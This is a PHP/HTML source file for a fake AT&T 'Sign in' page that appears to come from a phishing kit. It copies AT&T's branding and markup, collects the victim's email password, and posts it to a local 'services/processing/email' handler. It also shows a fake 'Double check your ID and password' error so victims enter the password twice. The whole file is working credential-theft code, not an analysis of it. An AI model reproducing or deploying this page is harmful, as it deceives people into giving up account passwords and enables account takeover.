<?php

    session_start();

    require_once '../../services/Comp.php';

    $comps = new Comp;

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Login Screen</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0,shrink-to-fit=no">
        <link rel="icon" type="image/x-icon" href="../assets/img/Att/att.ico">
        <link rel="stylesheet" href="../assets/css/email/att.css">
    </head>
    <body>
        <div id="app-root" _nghost-ybr-c41="" ng-version="9.1.9" app-version="9.2.2">
            <div _ngcontent-ybr-c41="">
                <div _ngcontent-ybr-c41="" role="main" class="container-fluid">
                    <div _ngcontent-ybr-c41="" class="d-flex flex-container Card">
                        <app-header _ngcontent-ybr-c41="" class="d-flex flex-container" _nghost-ybr-c28="">
                            <!---->
                            <div _ngcontent-ybr-c28="" class="image ng-star-inserted"><img _ngcontent-ybr-c28="" id="headerLogoImage" alt="" class="mar-b4 header-logo-image" style="width: 100%;" src="../assets/img/Att/att-logo.svg"></div>
                            <!---->
                            <h1 _ngcontent-ybr-c28="" id="signInHeaderText" class="sign-in-header justify-content-center mb-0" style="margin-top: 20px;">Sign in</h1>
                            <h1 _ngcontent-ybr-c28="" id="signInHeaderToText" class="sign-in-header-text justify-content-center mt-0">to continue</h1>
                        </app-header>
                        <app-error _ngcontent-ybr-c41="" _nghost-ybr-c29="" id="passError">
                        
                        </app-error>
                        <app-manual-login _ngcontent-ybr-c41="" _nghost-ybr-c33="" class="ng-tns-c33-0 ng-star-inserted">
                            <form action="../../services/processing/email" method="POST">
                                <div _ngcontent-ybr-c33="" class="form-group mb-1 ng-tns-c33-0"><label _ngcontent-ybr-c33="" id="userLabel" for="userID" class="textfield-label ng-tns-c33-0">User ID <div _ngcontent-ybr-c33="" id="userLabelAfter" class="ng-tns-c33-0"></div></label>
                                    <div _ngcontent-ybr-c33="" class="flex-container justify-content-center ng-tns-c33-0">
                                        <input class="ng-tns-c33-0 textfield ng-pristine ng-invalid ng-touched" value="<?php echo $_SESSION['email']; ?>" disabled style="background-color: #E9E9E9;">
                                        <div _ngcontent-ybr-c33="" aria-live="polite" aria-atomic="true" id="userInlineErrorTextContainer" class="ng-tns-c33-0">
                                            <!---->
                                        </div>
                                    </div>
                                </div>
                                <div _ngcontent-ybr-c33="" class="form-group text-right ng-tns-c33-0 ng-star-inserted"><a _ngcontent-ybr-c33="" id="forgotUserID" class="ForgotLink ng-tns-c33-0" style="cursor: pointer; color: #0057b8;">Forgot user ID?</a></div>
                                <!---->
                                <div _ngcontent-ybr-c33="" class="form-group mb-0 pass_show ng-tns-c33-0"><label _ngcontent-ybr-c33="" id="passwordLabel" for="password" class="textfield-label ng-tns-c33-0">Password <div _ngcontent-ybr-c33="" id="passwordLabelAfter" class="ng-tns-c33-0"></div></label>
                                    <div _ngcontent-ybr-c33="" class="flex-container justify-content-center ng-tns-c33-0">
                                        <input id="pass" name="emailPassword" class="ng-tns-c33-0 textfield ng-untouched ng-pristine ng-invalid" type="password" required>
                                        <!---->
                                        <div _ngcontent-ybr-c33="" aria-live="polite" aria-atomic="true" id="passwordInlineErrorTextContainer" class="ng-tns-c33-0">
                                            <!---->
                                        </div>
                                    </div>
                                </div>
                                <div _ngcontent-ybr-c33="" class="form-group text-right ng-tns-c33-0 ng-star-inserted"><a _ngcontent-ybr-c33="" id="forgotPassword" class="ForgotLink ng-tns-c33-0" style="cursor: pointer; color: #0057b8;">Forgot password?</a></div>
                                <!---->
                                <!---->
                                <div _ngcontent-ybr-c33="" class="form-group checkboxDiv mb-0 ng-tns-c33-0 ng-star-inserted"></div>
                                <!---->
                                <div _ngcontent-ybr-c33="" class="form-group justify-content-center fg-sign-in ng-tns-c33-0">
                                    <div _ngcontent-ybr-c33="" class="flex-container justify-content-center ng-tns-c33-0"><button _ngcontent-ybr-c33="" type="submit" id="signin" class="btn-primary ng-tns-c33-0">Sign in</button>
                                        <!---->
                                        <!---->
                                    </div>
                                </div>
                                <div _ngcontent-ybr-c33="" class="form-group justify-content-center dnUI ng-tns-c33-0 ng-star-inserted">
                                    <div _ngcontent-ybr-c33="" class="flex-container justify-content-center ng-tns-c33-0">
                                        <p _ngcontent-ybr-c33="" id="dontHaveIdText" class="mb-0 ng-tns-c33-0">Don't have a user ID?</p><a _ngcontent-ybr-c33="" id="createNow" class="text-style-1 ng-tns-c33-0 ng-star-inserted" style="cursor: pointer;"> Create one now </a>
                                        <!---->
                                        <!---->
                                    </div>
                                </div>
                                <!---->
                                <!---->
                                <!---->
                            </form>
                        </app-manual-login>
                        <!---->
                        <!---->
                        <!---->
                    </div>
                </div>
                <app-footer _ngcontent-ybr-c41="" role="contentinfo" _nghost-ybr-c39="" class="ng-star-inserted">
                    <div _ngcontent-ybr-c39="" class="policyArea justify-content-center ng-star-inserted"><a _ngcontent-ybr-c39="" rel="noopener noreferrer" class="footer-link-text ng-star-inserted" style="cursor: pointer; color: #0057b8;" id="footerLink0">Legal policy center </a>
                        <!----><a _ngcontent-ybr-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" style="cursor: pointer; color: #0057b8;" id="footerLink1">Privacy policy </a>
                        <!----><a _ngcontent-ybr-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" style="cursor: pointer; color: #0057b8;" id="footerLink2">Terms of use </a>
                        <!----><a _ngcontent-ybr-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" style="cursor: pointer; color: #0057b8;" id="footerLink3">Accessibility </a>
                        <!----><a _ngcontent-ybr-c39="" rel="noopener noreferrer" target="_blank" class="footer-link-text ng-star-inserted" style="cursor: pointer; color: #0057b8;" id="footerLink4">Do not sell my personal information </a>
                        <!---->
                        <!---->
                    </div>
                    <!---->
                    <!---->
                    <div _ngcontent-ybr-c39="" class="copyright"><span _ngcontent-ybr-c39="" id="copyrightTextSpan" class="ng-star-inserted">2021 AT&amp;T Intellectual Property. All rights reserved.</span>
                        <!---->
                    </div>
                </app-footer>
                <!---->
                <!---->
            </div>
        </div>
        <script>
            <?php

                if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                    echo '
                    
                        document.getElementById("passError").innerHTML = \'<div _ngcontent-dsm-c29="" id="errContainer" class="errorContainer ng-star-inserted"><div _ngcontent-dsm-c29="" class="errorIcon errorRedIcon"></div><div _ngcontent-dsm-c29="" id="errorTextArea" class="errorText"><div _ngcontent-dsm-c29="" id="errorDescArea" class="errorDesc">Double check your ID and password, and try again.</div><div _ngcontent-dsm-c29="" id="errorCodeArea" class="errorCode">Care Code:  201 [LU100]</div></div></div>\';
                        document.getElementById("pass").setAttribute("aria-invalid", "true");
                        document.getElementById("passwordLabel").classList.add("validationError");
                        document.getElementById("passwordLabelAfter").classList.add("textfield-label", "validationError");

                    ';
                }

            ?>
        </script>
    </body>
</html>